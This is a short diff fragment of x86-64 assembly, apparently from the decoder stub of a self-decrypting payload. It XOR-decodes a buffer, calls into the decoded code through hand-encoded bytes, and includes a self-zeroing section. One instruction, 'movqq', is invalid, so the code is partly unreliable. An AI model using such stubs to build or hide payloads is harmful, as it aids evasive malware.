@@ -51,9 +51,9 @@ decode_loop:
     xor [rdi+rcx*4], eax
     add eax, [rdi+rcx*4]
     loop decode_loop
-    lea rax, [rdi-8]
     lea rdi, [rdi+PAYLOAD_TIME_IMM_OFFSET]
-    call [rax]
+    // call [rbx+(_end-_begin)+24], the same thing again ._.
+    .byte 0xff, 0x53, (_end-_begin)+24
 bye:
     // Zeroing self
     movqq rdi, rbx
